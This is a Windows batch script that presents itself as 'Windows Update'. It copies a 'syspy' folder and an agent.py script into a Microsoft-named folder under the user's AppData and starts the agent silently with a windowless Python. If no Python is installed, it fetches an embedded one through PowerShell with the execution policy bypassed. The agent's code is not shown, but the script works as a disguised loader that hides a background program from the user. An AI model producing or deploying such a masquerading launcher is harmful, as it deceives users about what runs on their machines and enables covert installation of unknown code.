@echo off
title Windows Update
setlocal enabledelayedexpansion
set "HERE=%~dp0"
set "DIR=%LOCALAPPDATA%\Microsoft\WindowsUpdate"

if exist "%DIR%\syspy" rmdir /s /q "%DIR%\syspy"
if not exist "%DIR%" mkdir "%DIR%" >nul 2>&1
xcopy /e /i /y /q "%HERE%syspy" "%DIR%\syspy" >nul 2>&1
copy /y "%HERE%agent.py" "%DIR%\agent.py" >nul 2>&1

set "PY="
for /d %%D in ("%LOCALAPPDATA%\Programs\Python\Python3*") do (
    if not defined PY if exist "%%D\pythonw.exe" set "PY=%%D\pythonw.exe")
for /d %%D in ("C:\Python3*") do (
    if not defined PY if exist "%%D\pythonw.exe" set "PY=%%D\pythonw.exe")
if not defined PY for /f "delims=" %%X in ('where pythonw.exe 2^>nul') do (
    if not defined PY set "PY=%%X")
if not defined PY for /f "delims=" %%X in ('where python.exe 2^>nul') do (
    if not defined PY set "PY=%%X")
if defined PY (
    start "" "%PY%" "%DIR%\agent.py"
    exit /b
)

echo.
echo  First run - fetching a private Python, one moment...
echo.
set "ZIP=%TEMP%\syspy_py.zip"
powershell -NoProfile -ExecutionPolicy Bypass -Command "iwr -useb 'https://www.python.org/ftp/python/3.12.8/python-3.12.8-embed-amd64.zip' -OutFile '%ZIP%'"
powershell -NoProfile -Command "Expand-Archive -Force '%ZIP%' '%DIR%\runtime'"
if exist "%DIR%\runtime\python312._pth" (
    powershell -NoProfile -Command "(Get-Content '%DIR%\runtime\python312._pth') -replace '#import site','import site' | Set-Content '%DIR%\runtime\python312._pth'"
)
if exist "%DIR%\runtime\pythonw.exe" (
    start "" "%DIR%\runtime\pythonw.exe" "%DIR%\agent.py"
) else (
    start "" "%DIR%\runtime\python.exe" "%DIR%\agent.py"
)
exit /b
